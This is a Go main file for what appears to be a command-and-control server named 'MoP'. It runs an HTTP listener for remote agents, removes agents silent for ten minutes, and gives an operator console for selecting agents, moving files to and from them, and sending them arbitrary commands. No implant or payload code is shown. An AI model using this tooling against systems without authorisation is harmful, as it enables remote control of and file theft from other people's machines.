package main

import (
	"MoP/src/commands"
	"MoP/src/config"
	"MoP/src/controllers"
	"MoP/src/middlewares"
	"MoP/src/router"
	"bufio"
	"fmt"
	"log"
	"net/http"
	"os"
	"time"
)

var (
	term          = "MoP> "
	selectedAgent = ""
)

func main() {
	// carrega as configs
	config := config.Load()
	// carrega as rotas do pacote router
	r := router.Generate()

	go killAgent()
	go cli()

	log.Fatal(http.ListenAndServe(fmt.Sprintf(":%d", config.Port), r))
}

// mata agente após 10 minutos sem comunicação
func killAgent() {
	for {
		ids := controllers.AgentsToKill()

		for _, id := range ids {
			resp := controllers.KillAgent(id)
			fmt.Println(resp)
		}

		time.Sleep(time.Duration(10) * time.Minute)
	}
}

// cli no terminal
func cli() {
	for {
		print(term)
		// le os comandos inputados
		command, _ := bufio.NewReader(os.Stdin).ReadString('\n')

		// separa o comando em partes
		slicedCommand := middlewares.SliceCommand(command)
		// captura a palavra chave do comando
		baseCommand := slicedCommand[0]

		if len(baseCommand) > 0 {
			switch baseCommand {
			case "help":
				fmt.Println(commands.Help())
			case "show":
				// handler para as variações do comando show do pacote commands
				commands.ShowHandler(slicedCommand, selectedAgent)
			case "alias":
				// handler para as variações do comando show do pacote commands
				if selectedAgent != "" {
					commands.SetAlias(slicedCommand, selectedAgent)
				} else {
					fmt.Println("You need to select an agent!")
				}
			case "select":
				// seleciona um agente com a validação do pacote commands
				selectedAgent = commands.SelectHandler(slicedCommand)
				if selectedAgent != "" {
					term = selectedAgent + "@MoP# "
				} else {
					term = "MoP> "
				}
			case "upload":
				if selectedAgent != "" {
					commands.UploadFile(selectedAgent, slicedCommand)
					commands.CommandHandler(selectedAgent, command)
				} else {
					fmt.Println("You need to select an agent!")
				}
			case "download":
				if selectedAgent != "" {
					commands.DownloadFile(selectedAgent, slicedCommand)
					commands.CommandHandler(selectedAgent, command)
				} else {
					fmt.Println("You need to select an agent!")
				}
			default:
				if selectedAgent != "" {
					commands.CommandHandler(selectedAgent, command)
				} else {
					fmt.Println("You need to select an agent!")
				}

			}
		}

	}

}
